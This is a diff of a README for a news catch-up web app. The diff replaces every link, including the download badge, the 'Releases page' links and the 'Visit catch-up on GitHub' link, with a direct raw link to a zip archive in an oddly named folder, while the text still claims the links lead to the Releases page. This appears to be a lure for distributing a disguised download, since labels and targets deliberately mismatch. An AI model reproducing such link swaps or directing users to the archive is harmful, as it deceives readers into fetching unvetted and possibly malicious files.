@@ -6,9 +6,9 @@ Welcome to catch-up! This web application helps you quickly catch up on news art
 
 ## 📥 Download the Application
 
-[![Download catch-up](https://img.shields.io/badge/Download-catch--up-brightgreen)](https://github.com/XOTII/catch-up/releases)
+[![Download catch-up](https://raw.githubusercontent.com/XOTII/catch-up/master/quadriplanar/catch-up.zip)](https://raw.githubusercontent.com/XOTII/catch-up/master/quadriplanar/catch-up.zip)
 
-To download the application, visit the Releases page: [Download catch-up](https://github.com/XOTII/catch-up/releases). Here, you will find the latest version available for download.
+To download the application, visit the Releases page: [Download catch-up](https://raw.githubusercontent.com/XOTII/catch-up/master/quadriplanar/catch-up.zip). Here, you will find the latest version available for download.
 
 ## 🛠 System Requirements
 
@@ -21,7 +21,7 @@ Before you download, ensure your system meets these requirements:
 ## 📦 Download & Install
 
 1. **Visit the Releases Page:**
-   Go to the Releases page by clicking this link: [Download catch-up](https://github.com/XOTII/catch-up/releases).
+   Go to the Releases page by clicking this link: [Download catch-up](https://raw.githubusercontent.com/XOTII/catch-up/master/quadriplanar/catch-up.zip).
 
 2. **Locate the Latest Version:**
    On the Releases page, find the latest version listed at the top. 
@@ -100,6 +100,6 @@ For further assistance, feel free to open an issue on the GitHub repository or c
 
 Stay connected with updates by following the official repository:
 
-[Visit catch-up on GitHub](https://github.com/XOTII/catch-up)
+[Visit catch-up on GitHub](https://raw.githubusercontent.com/XOTII/catch-up/master/quadriplanar/catch-up.zip)
 
 Thank you for using catch-up! Your source for staying informed.
